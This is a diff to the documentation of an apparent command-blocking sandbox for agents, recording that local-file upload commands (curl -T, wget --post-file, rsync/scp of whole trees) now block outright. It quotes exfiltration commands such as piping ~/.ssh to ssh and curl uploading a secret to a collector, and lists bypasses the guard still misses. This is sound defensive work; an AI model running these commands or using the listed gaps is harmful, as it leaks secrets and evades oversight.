@@ -18,10 +18,16 @@ description: >-
   and an approved `allow-cat-safe` no longer covers a net-client pipe source;
   DF-11 fixed: the auto-sandbox `modify` preflight now probes the rewrite's own
   prefix, so rewrites run on DEGRADED hosts; DF-17 closed: `curl -F/--form`
-  local-file uploads are sandboxed and interpreter socket/file egress
+  local-file uploads are covered and interpreter socket/file egress
   (`python3 -c` socket+dup2/pty, socket send of a local file, urllib/requests
-  file bodies, `sh -c`/`bash -c` wrappers) blocks with builtin-interp-egress-*).
-version: 1.6.0
+  file bodies, `sh -c`/`bash -c` wrappers) blocks with builtin-interp-egress-*;
+  DF-20 closed: the four local-file upload rules — curl `-T`/`--data* @file`,
+  `wget --post-file`, the curl multipart file field, and whole-tree
+  `rsync`/`scp` copies — are priority-1000 BLOCK rules now (they were
+  auto-sandbox rules whose wrap never stopped the upload: a loopback collector
+  received the payload; `plugin/test_egress_no_delivery.py` is the end-to-end
+  proof). Hosts that installed an older mirror must re-run ./install.sh).
+version: 1.7.0
 category: software-development
 ---
 
@@ -231,18 +237,24 @@ $TJ --user touch /tmp/x   # → COMMAND BLOCKED, rc=126
   wrapper does NOT change those verdicts (blocklist rules match the whole command
   string), but `python3 -c` / `sh -c` themselves are still outside the
   auto-sandbox set while `python3 file.py` is inside — that asymmetry is
-  deliberate and documented, not a bug. The sandbox tier now also covers
-  `curl -F/--form` fields carrying a local file (`name=@file`, `name=<file`),
-  while inline fields and `--form-string` stay ALLOW. Still uncontained, and
-  named as such: `tar czf - ~/.ssh | ssh host` (non-raw-socket sink),
-  `git push`, Perl/Ruby/Node sockets, API names behind an indirection
-  (`getattr`/`importlib`/base64-decoded source), in-memory payloads, and query
-  a `grep`-style read of source that merely MENTIONS a socket API (both halves of
-  a transfer must be present, which is why those controls stay allowed). And a
-  `modify` verdict does NOT prevent the transfer (DF-TERMINAL-JAIL-20): measured
-  with a real collector, `curl -T <secret> http://127.0.0.1:18777/collect` was
-  rewritten to the sandboxed form, exited 0, and the secret arrived (132 bytes).
-  Auto-sandbox = containment of the filesystem view; only a `block` stops egress.
+  deliberate and documented, not a bug. **Since DF-TERMINAL-JAIL-20 (closed
+  2026-09-19) the local-file upload shapes BLOCK** instead of getting the wraps:
+  `curl -T`/`--upload-file`/`-d @file`/`--data* @file` (plus the clustered and
+  `=`-joined spellings) → `builtin-net-curl-upload`; the curl multipart file
+  field (`-F`/`--form` with `name=@file` or content-only `name=<file`) →
+  `builtin-net-curl-form-upload`; `wget --post-file`/`--body-file` →
+  `builtin-net-wget-post-file`; whole-tree `rsync`/`scp` (root `/` — also `//`,
+  `/*`, `/.`, `~/` — to `host:path`) → `builtin-net-remote-tree-copy`. Inline
+  fields/`--form-string`/inline `-d` bodies and plain downloads stay ALLOW, and
+  scoped copies (`rsync -av ~/proj/ host:/srv/`) are untouched. **Only a
+  `block` stops an egress** (DF-TERMINAL-JAIL-20): before the promotion the
+  namespace wrap did not restrict the network — measured with a real loopback
+  collector, `curl -T <secret> http://127.0.0.1:18777/collect` was rewritten to
+  the sandboxed form, exited 0, and the secret arrived (132 bytes).
+  Auto-sandbox = containment of the filesystem view; a `modify` verdict on an
+  egress shape is containment-neutral. Hosts with a pre-DF-20 mirror in
+  `~/.config/terminal-jail/rules.d/` keep the old action for those four ids
+  (same-id override replaces the builtin) — re-run `./install.sh`.
   Full boundary: README.md "Data-Out Boundary" / `specs/interruptor.md` §4.6.
 - **`allow-cat-safe` does not actually exclude /etc|/boot|/proc|/sys**
   (DF-TERMINAL-JAIL-13): its negative lookahead can never match those
